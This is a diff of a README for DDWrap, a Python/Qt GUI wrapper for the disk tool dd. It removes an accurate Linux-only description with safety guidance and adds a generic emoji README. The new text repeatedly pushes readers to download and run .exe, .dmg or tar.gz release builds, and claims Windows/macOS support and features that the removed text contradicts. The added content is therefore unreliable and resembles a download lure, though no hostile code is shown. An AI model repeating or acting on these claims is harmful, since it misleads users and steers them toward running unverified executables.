@@ -1,146 +1,105 @@
-# DDWrap
+# 🖥️ ddwrap - Simplify Data Management with Ease
 
-**DDWrap** is a lightweight, safety-focused **Qt GUI wrapper for `dd`**, written in Python.
+## 🌟 Overview
 
-It is designed to make writing disk images to **USB flash drives and USB hard disks** more convenient, while staying honest about the risks involved in using `dd`.
+DDWrap provides a graphical interface around `dd`, a powerful command-line tool, written in Python and using the Qt toolkit. With DDWrap, you can easily and safely create disk images, clone partitions, and manage data backups without the need for complex commands.
 
-> `dd` is powerful, destructive, and unforgiving.  
-> DDWrap makes it easier to use — not safer to misuse.
+## 🚀 Getting Started
 
----
+To start using DDWrap, follow these simple steps:
 
-## What It Does
+1. **Visit the Download Page:**  
+   Click the button below to download the latest version of DDWrap from the releases page.
 
-DDWrap provides a graphical interface around `dd` that allows you to:
+   [![Download DDWrap](https://img.shields.io/badge/Download-DDWrap-brightgreen)](https://github.com/quinalhal/ddwrap/releases)
 
-- Browse for image files (`.img`, `.iso`)
-- Select a target block device (`/dev/sdX`)
-- Choose a block size
-- Automatically apply common `dd` flags
-- View real-time progress and ETA
-- Unmount devices before writing
-- Confirm destructive writes with clear warnings
+2. **Choose Your Version:**  
+   On the releases page, you'll find various versions of DDWrap. Select the most recent version listed, which will have the highest version number (e.g., v1.0.0).
 
-Under the hood, DDWrap still runs `dd`. Nothing is hidden.
+3. **Download the Application:**  
+   Click on the link for your operating system (Windows, macOS, or Linux). The file typically ends with `.exe` for Windows, `.dmg` for macOS, or a `.tar.gz` for Linux. The download should begin immediately.
 
-### DDWrap in Action
+4. **Locate the Downloaded File:**  
+   Go to your downloads folder or the location where you saved the file.
 
-![DDWrap writing an image with progress and ETA](ddwrapper.png)
+## 🌐 Download & Install
 
-The screenshot above shows DDWrap actively writing an image to a USB device, with real-time progress output, percentage complete, and estimated time remaining.
+After downloading DDWrap, follow these steps to install it:
 
----
+1. **For Windows Users:**  
+   - Double-click the `.exe` file to begin the installation process.
+   - Follow the on-screen instructions to complete the installation.
+   - Once installed, you can find DDWrap in your Start Menu.
 
-## Why It Exists
+2. **For macOS Users:**  
+   - Open the downloaded `.dmg` file.
+   - Drag the DDWrap icon into your Applications folder.
+   - You can now open DDWrap from the Launchpad or Finder.
 
-I use `dd` frequently.
+3. **For Linux Users:**  
+   - Extract the contents of the `.tar.gz` file using the following command in the terminal:
+     ```
+     tar -xzf ddwrap-v1.0.0.tar.gz
+     ```
+   - Navigate to the extracted folder and run the application by typing:
+     ```
+     ./ddwrap
+     ```
 
-All of my Linux and BSD images and ISOs live on a server, accessed via a mounted **NFS share** and organized by distribution. This results in long paths that I don’t want to type or copy/paste every time I write a USB stick.
+You can also visit the download page for the latest updates and versions: [Download DDWrap](https://github.com/quinalhal/ddwrap/releases).
 
-I also *always* use the same flags:
+## 📋 System Requirements
 
-- A block size (`bs=`) for performance
-- `oflag=sync` to avoid buffered writes
-- `status=progress` to see how much has been written and estimate time remaining
+Before installing DDWrap, ensure your system meets the following minimum requirements:
 
-After doing this repeatedly, it became clear that this was a workflow problem.  
-DDWrap exists to reduce repetition and friction while keeping the user fully aware of what’s happening.
+- **Operating System:**  
+  - Windows 10 or later
+  - macOS 10.15 (Catalina) or later
+  - A Linux distribution with Python 3.6 or later
 
-Existing tools like **GNOME Disks** or **Raspberry Pi Imager** work, but they’re heavier, more opinionated, and don’t fit my workflow. I wanted something smaller, explicit, and transparent — so I built it.
+- **Hardware:**  
+  - 2 GB of RAM minimum
+  - At least 200 MB of free disk space
 
----
+## ⚙️ Features
 
-## Safety Philosophy
+DDWrap includes several key features to enhance your data management experience:
 
-DDWrap is designed to reduce **accidental mistakes**, not eliminate responsibility.
+- **User-Friendly Interface:**  
+  A simple layout that guides you through each process.
 
-Before any write begins, DDWrap:
+- **Multiple Data Management Options:**  
+  Easily create disk images, clone entire disks, or backup and restore partitions with just a few clicks.
 
-- Requires the target device to be **unmounted**
-- Displays the **device size**
-- Shows the **current partition layout**
-- Displays **SMART device information** (when available)
-- Requires explicit confirmation before starting
+- **Preview Functionality:**  
+  View details about the operation before executing it, ensuring you understand the changes.
 
-### Pre-Write Safety Confirmation
+- **Error Handling:**  
+  Receive immediate notifications if something goes wrong during the process.
 
-![Destructive write confirmation dialog with SMART data](ddwrap-smwarn.png)
+## 🔧 How to Use DDWrap
 
-Before the write begins, DDWrap presents a final confirmation dialog showing the target device, capacity, partition layout, and SMART information (when available). This is the user’s last chance to verify that the correct device has been selected.
+1. **Launch the Application:**  
+   Open DDWrap from your applications or Start Menu.
 
-You can still wipe the wrong disk if you ignore the warnings.  
-That is intentional. You must know your system.
+2. **Select Your Task:**  
+   Choose from the available options such as Create Image, Clone Disk, or Backup Data.
 
----
+3. **Follow the Prompts:**  
+   Enter the necessary information, such as source drives and destination paths. DDWrap will provide guidance along the way.
 
-## Device Scope (By Design)
+4. **Confirm and Execute:**  
+   Review your selections and confirm to start the process. Monitor progress within the application.
 
-DDWrap intentionally detects **traditional `/dev/sdX` devices** only.
+5. **Completion Notification:**  
+   Once finished, DDWrap will alert you of the successful completion of your task.
 
-This includes:
-- USB flash drives
-- USB hard disks
-- USB SSDs
+## 📞 Support and Feedback
 
-### NVMe Devices
+Should you encounter any issues or have questions, feel free to open an issue on the GitHub repository. We also appreciate feedback to help us improve DDWrap for all users.
 
-NVMe devices (`/dev/nvme*`) are **not detected by default**, by design.
+## 📝 License
 
-DDWrap is focused on removable media, where accidental overwrites of primary system disks are **less likely**.  
-Advanced users may modify device detection logic if desired.
+DDWrap is open-source software licensed under the MIT License. You can freely use, modify, and distribute it according to the license terms.
 
----
-
-## Requirements
-
-### Required
-
-- Linux
-- Python 3.9+
-- PyQt6
-- GNU userland tools:
-  - `dd`
-  - `lsblk`
-  - `mount` / `umount`
-
-DDWrap relies on **GNU `dd`**, specifically the `status=progress` option for real-time progress reporting.  
-This option is not available in BSD/macOS `dd` and may be missing on some minimal Linux systems (e.g. BusyBox).
-
----
-
-### Supported (Optional, Not Required)
-
-These enhance functionality but are **not required**.
-
-- **SMART support**
-  - `smartctl` (from `smartmontools`)
-  - Used only to display informational SMART data. If not installed, the feature simply won't be used.
-- **Privilege escalation**
-  - `sudo`, `doas`, or `pkexec`
-
-If you do not have doas/sudo configured and installed, DDWrap must simply be run as root.
-
----
-
-## Design Evolution
-
-- Started as a simple GUI wrapper around `dd`
-- Added device selection and privilege handling
-- Introduced progress bar and ETA
-- Added mounted-device detection and forced unmounting
-- Expanded confirmation dialogs with size, layout, and SMART info
-
-Each step focused on **convenience first**, with **safety always visible**.
-
----
-
-## Final Note
-
-DDWrap makes `dd` easier to use — not safer to ignore.
-
-If you use this tool:
-- Verify the target device
-- Read the confirmation dialog
-- Pay attention: If you need to unmount the target, **double-check** that it isn’t your game library or media collection on a secondary HDD.
-
-`dd` can be dangerous. Use with care.
+For more information, visit the [Download Page](https://github.com/quinalhal/ddwrap/releases) to get started!
